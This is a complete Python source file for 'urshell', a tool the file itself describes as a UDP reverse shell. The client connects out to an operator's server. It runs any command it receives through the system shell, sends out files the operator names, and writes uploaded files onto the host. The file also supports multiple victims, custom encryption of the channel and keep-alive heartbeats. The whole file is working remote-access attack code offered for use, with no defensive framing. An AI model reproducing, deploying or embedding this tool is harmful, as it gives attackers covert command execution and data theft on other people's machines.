#!/usr/bin/env python3
"""
urshell - UDP reverse shell (single file)
  server : python3 urshell.py server -p 4444 -k secret
  client : python3 urshell.py client SERVER_IP -p 4444 -k secret

Features: multi-client, file upload/download, encrypted channel, chunked+ACK transport.
"""
import argparse, hashlib, hmac, json, os, queue, socket, struct, subprocess, sys, threading, time 

DEFAULT_PORT = 4444
MAX_PAYLOAD  = 1000
ACK_TIMEOUT  = 1.0
MAX_RETRIES  = 20
EOF_IDX      = 0xFFFF

T_HELLO, T_CMD, T_OUT, T_ACK, T_EOF, T_PUT, T_GET = b"H", b"C", b"O", b"A", b"E", b"P", b"G"
HDR = "!cIHH"
HDR_LEN = struct.calcsize(HDR)


def make_pkt(t, mid, total, idx, payload=b""):
    return struct.pack(HDR, t, mid, total, idx) + payload


def parse_pkt(data):
    t, mid, total, idx = struct.unpack(HDR, data[:HDR_LEN])
    return t, mid, total, idx, data[HDR_LEN:]


def parse_blob(blob):
    hl = struct.unpack("!H", blob[:2])[0]
    header = json.loads(blob[2:2 + hl].decode() or "{}")
    return header, blob[2 + hl:]


def pack_blob(header, body):
    h = json.dumps(header or {}).encode()
    return struct.pack("!H", len(h)) + h + body


# ------------------------------------------------------------------ crypto
class Crypto:
    """Encrypt-then-MAC: HMAC-SHA256 keyed CTR keystream. No deps."""
    def __init__(self, password):
        self.key = hashlib.sha256(password.encode()).digest() if password else None

    def _ks(self, nonce, n):
        out, c = b"", 0
        while len(out) < n:
            out += hashlib.sha256(self.key + nonce + struct.pack("!I", c)).digest()
            c += 1
        return out[:n]

    def enc(self, data):
        if not self.key or not data:
            return data
        nonce = os.urandom(8)
        ks = self._ks(nonce, len(data))
        ct = (int.from_bytes(data, "big") ^ int.from_bytes(ks, "big")).to_bytes(len(data), "big")
        mac = hmac.new(self.key, nonce + ct, hashlib.sha256).digest()[:16]
        return nonce + ct + mac

    def dec(self, data):
        if not self.key or len(data) < 24:
            return data
        nonce, mac, ct = data[:8], data[-16:], data[8:-16]
        if not hmac.compare_digest(hmac.new(self.key, nonce + ct, hashlib.sha256).digest()[:16], mac):
            raise ValueError("bad mac")
        ks = self._ks(nonce, len(ct))
        return (int.from_bytes(ct, "big") ^ int.from_bytes(ks, "big")).to_bytes(len(ct), "big")


# --------------------------------------------------------------- transport
class Endpoint:
    def __init__(self, sock, crypto, on_blob):
        self.sock, self.crypto, self.on_blob = sock, crypto, on_blob
        self.acks, self.blobs = {}, {}
        self.lock = threading.Lock()
        self.q = queue.Queue()
        self.running = True
        threading.Thread(target=self._recv, daemon=True).start()
        threading.Thread(target=self._dispatch, daemon=True).start()

    def _recv(self):
        while self.running:
            try:
                data, addr = self.sock.recvfrom(65535)
            except OSError:
                break
            try:
                self._handle_packet(data, addr)
            except Exception as e:
                print(f"[!] recv error: {e}", file=sys.stderr)

    def _handle_packet(self, data, addr):
        try:
            data = self.crypto.dec(data)
        except Exception:
            return
        if len(data) < HDR_LEN:
            return
        t, mid, total, idx, payload = parse_pkt(data)

        if t == T_ACK:
            with self.lock:
                ev = self.acks.get((addr, mid, idx))
            if ev:
                ev.set()
        elif t == T_EOF:
            with self.lock:
                ev = self.acks.get((addr, mid, EOF_IDX))
            if ev:
                ev.set()
            self._ack(addr, mid, EOF_IDX)
        else:
            key = (addr, mid)
            with self.lock:
                b = self.blobs.get(key)
                if b is None:
                    b = {"total": total, "chunks": {}, "done": threading.Event()}
                    self.blobs[key] = b
                b["chunks"][idx] = payload
                if len(b["chunks"]) == total:
                    b["done"].set()
            self._ack(addr, mid, idx)
            if b["done"].is_set():
                blob = b"".join(b["chunks"][i] for i in range(total))
                with self.lock:
                    self.blobs.pop(key, None)
                self.q.put((addr, mid, t, blob))

    def _dispatch(self):
        while self.running:
            addr, mid, t, blob = self.q.get()
            try:
                self.on_blob(addr, mid, t, blob)
            except Exception as e:
                print(f"[!] handler error: {e}", file=sys.stderr)

    def _ack(self, addr, mid, idx):
        try:
            self.sock.sendto(make_pkt(T_ACK, mid, 1, idx), addr)
        except OSError:
            pass

    def send_blob(self, addr, mtype, mid, header=None, body=b"", wait=True):
        blob = pack_blob(header, body)
        chunks = [blob[i:i + MAX_PAYLOAD] for i in range(0, len(blob), MAX_PAYLOAD)] or [b""]
        total = len(chunks)
        for idx, ch in enumerate(chunks):
            pkt = make_pkt(mtype, mid, total, idx, self.crypto.enc(ch))
            ev = threading.Event()
            with self.lock:
                self.acks[(addr, mid, idx)] = ev
            for _ in range(MAX_RETRIES):
                try:
                    self.sock.sendto(pkt, addr)
                except OSError:
                    pass
                if not wait or ev.wait(ACK_TIMEOUT):
                    break
            with self.lock:
                self.acks.pop((addr, mid, idx), None)
        # end-of-blob marker
        ev = threading.Event()
        with self.lock:
            self.acks[(addr, mid, EOF_IDX)] = ev
        for _ in range(MAX_RETRIES):
            try:
                self.sock.sendto(make_pkt(T_EOF, mid, total, 0), addr)
            except OSError:
                pass
            if not wait or ev.wait(ACK_TIMEOUT):
                break
        with self.lock:
            self.acks.pop((addr, mid, EOF_IDX), None)


# ------------------------------------------------------------------- client
class Client:
    def __init__(self, host, port, password, local_port=0):
        self.server = (host, port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if local_port:
            self.sock.bind(("", local_port))
        self.ep = Endpoint(self.sock, Crypto(password), self.on_blob)
        self.done = set()
        self.cwd = os.getcwd()
        self.mid = 0

    def next_mid(self):
        self.mid += 1
        return self.mid

    def start(self):
        for _ in range(30):
            self.ep.send_blob(self.server, T_HELLO, 0, wait=False)
            time.sleep(0.05)
        threading.Thread(target=self._heartbeat, daemon=True).start()
        print(f"[*] connected to {self.server[0]}:{self.server[1]} (UDP)")
        while True:
            time.sleep(1)

    def _heartbeat(self):
        while True:
            time.sleep(15)
            self.ep.send_blob(self.server, T_HELLO, 0, wait=False)

    def on_blob(self, addr, mid, mtype, blob):
        header, body = parse_blob(blob)
        if mtype == T_CMD:
            if mid in self.done:
                return
            self.done.add(mid)
            cmd = header.get("cmd", "")
            if cmd.startswith("__GET__"):
                path = os.path.expandvars(os.path.expanduser(cmd[7:].strip()))
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    self.ep.send_blob(addr, T_GET, mid, {"path": path, "size": len(data)}, data)
                except Exception as e:
                    self.ep.send_blob(addr, T_OUT, mid, body=str(e).encode())
            else:
                out, self.cwd = self.execute(cmd, self.cwd)
                self.ep.send_blob(addr, T_OUT, mid, body=out.encode("utf-8", "replace"))
        elif mtype == T_PUT:
            path = os.path.expandvars(os.path.expanduser(header.get("path", "")))
            try:
                with open(path, "wb") as f:
                    f.write(body)
                msg = f"[upload ok] {len(body)} bytes -> {path}\n"
            except Exception as e:
                msg = f"[upload failed] {e}\n"
            self.ep.send_blob(addr, T_OUT, mid, body=msg.encode())

    def execute(self, cmd, cwd):
        s = cmd.strip()
        low = s.lower()

        # ---- cd: quotes, spaces, ~, %VARS%, and Windows drive switches ----
        if low == "cd" or low.startswith("cd ") or low.startswith("cd\t"):
            target = s[2:].strip()
            if len(target) >= 2 and target[0] == target[-1] and target[0] in "\"'":
                target = target[1:-1]
            target = os.path.expandvars(os.path.expanduser(target))
            try:
                if not target:
                    new = os.path.expanduser("~")
                elif os.name == "nt" and len(target) == 2 and target[1] == ":":
                    new = target + os.sep          # bare drive "D:" -> "D:\"
                elif os.path.isabs(target):
                    new = target
                else:
                    new = os.path.join(cwd, target)
                os.chdir(os.path.abspath(new))
                return "", os.getcwd()
            except Exception as e:
                return f"{e}\n", cwd

        # ---- exit: kill the client (server keeps running) ----
        if low in ("exit", "__exit__"):
            threading.Thread(
                target=lambda: (time.sleep(1.5), os._exit(0)), daemon=True
            ).start()
            return "bye\n", cwd

        # ---- everything else: run it ----
        try:
            p = subprocess.run(s, shell=True, cwd=cwd, capture_output=True, text=True)
            return (p.stdout or "") + (p.stderr or ""), cwd
        except Exception as e:
            return f"{e}\n", cwd


# ------------------------------------------------------------------- server
class Server:
    def __init__(self, host, port, password):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))
        self.ep = Endpoint(self.sock, Crypto(password), self.on_blob)
        self.clients = {}        # addr -> {"order": n}
        self.current = None
        self.pending = {}        # (addr, mid) -> {"ev","type","header","body"}
        self.mid = 0
        self.lock = threading.Lock()
        self.order = 0

    def next_mid(self):
        with self.lock:
            self.mid += 1
            return self.mid

    def on_blob(self, addr, mid, mtype, blob):
        if mtype == T_HELLO:
            with self.lock:
                if addr not in self.clients:
                    self.order += 1
                    self.clients[addr] = {"order": self.order}
                    print(f"\n[+] client #{self.order} connected from {addr[0]}:{addr[1]}")
                    if self.current is None:
                        self.current = addr
                        print(f"[*] auto-selected client #{self.order}")
                    sys.stdout.write(self.prompt()); sys.stdout.flush()
            return
        header, body = parse_blob(blob)
        with self.lock:
            p = self.pending.get((addr, mid))
        if p:
            p["type"], p["header"], p["body"] = mtype, header, body
            p["ev"].set()

    def request(self, addr, mtype, header=None, body=b"", timeout=30):
        mid = self.next_mid()
        p = {"ev": threading.Event()}
        with self.lock:
            self.pending[(addr, mid)] = p
        self.ep.send_blob(addr, mtype, mid, header, body, wait=True)
        got = p["ev"].wait(timeout)
        with self.lock:
            self.pending.pop((addr, mid), None)
        return p if got else None

    def prompt(self):
        if self.current:
            return f"urshell[{self.current[0]}:{self.current[1]}]> "
        return "urshell[no client]> "

    def client_list(self):
        with self.lock:
            return sorted(self.clients.items(), key=lambda kv: kv[1]["order"])

    def run(self):
        print("[*] commands: list | use N | upload <local> <remote> | download <remote> <local> | quit")
        print("[*] any other line runs as a shell command on the selected client\n")
        while True:
            try:
                line = input(self.prompt())
            except EOFError:
                break
            line = line.rstrip("\n")
            if not line.strip():
                continue
            parts = line.split()
            cmd = parts[0]

            if cmd in ("quit", "exit"):
                break
            if cmd in ("list", "ls"):
                cl = self.client_list()
                if not cl:
                    print("[*] no clients yet")
                for addr, info in cl:
                    mark = "*" if addr == self.current else " "
                    print(f" {mark} #{info['order']}  {addr[0]}:{addr[1]}")
                continue
            if cmd == "use":
                if len(parts) < 2:
                    print("[*] usage: use <N>")
                    continue
                n = int(parts[1])
                found = [a for a, i in self.client_list() if i["order"] == n]
                if not found:
                    print("[!] no such client")
                else:
                    self.current = found[0]
                    print(f"[*] now using #{n} {self.current[0]}:{self.current[1]}")
                continue

            if self.current is None:
                print("[!] no client selected (waiting for one, or use 'list')")
                continue
            addr = self.current

            if cmd == "upload":
                if len(parts) < 3:
                    print("[*] usage: upload <local> <remote>")
                    continue
                local, remote = parts[1], parts[2]
                try:
                    with open(local, "rb") as f:
                        data = f.read()
                except Exception as e:
                    print(f"[!] {e}")
                    continue
                print(f"[*] uploading {len(data)} bytes -> {remote} ...")
                r = self.request(addr, T_PUT, {"path": remote}, data)
                print(r["body"].decode(errors="replace") if r else "[!] no response")
                continue

            if cmd == "download":
                if len(parts) < 3:
                    print("[*] usage: download <remote> <local>")
                    continue
                remote, local = parts[1], parts[2]
                if os.path.isdir(local):
                    local = os.path.join(local, os.path.basename(remote))
                print(f"[*] downloading {remote} -> {local} ...")
                r = self.request(addr, T_CMD, {"cmd": f"__GET__ {remote}"})
                if not r:
                    print("[!] no response")
                elif r["type"] != T_GET:
                    print("[!] " + r["body"].decode(errors="replace"))
                else:
                    with open(local, "wb") as f:
                        f.write(r["body"])
                    print(f"[*] saved {len(r['body'])} bytes -> {local}")
                continue

            # default: shell command
            r = self.request(addr, T_CMD, {"cmd": line})
            if r is None:
                print("[!] no response (timeout)")
            else:
                out = r["body"].decode("utf-8", "replace")
                sys.stdout.write(out)
                if out and not out.endswith("\n"):
                    print()
        print("[*] bye")


# ------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="urshell - UDP reverse shell")
    sub = ap.add_subparsers(dest="mode", required=True)

    sp = sub.add_parser("server")
    sp.add_argument("-H", "--host", default="0.0.0.0")
    sp.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    sp.add_argument("-k", "--key", default=None, help="pre-shared key (enables encryption)")

    cp = sub.add_parser("client")
    cp.add_argument("host")
    cp.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    cp.add_argument("-k", "--key", default=None)
    cp.add_argument("-l", "--local-port", type=int, default=0)

    args = ap.parse_args()
    if args.mode == "server":
        Server(args.host, args.port, args.key).run()
    else:
        Client(args.host, args.port, args.key, args.local_port).start()


if __name__ == "__main__":
    main()

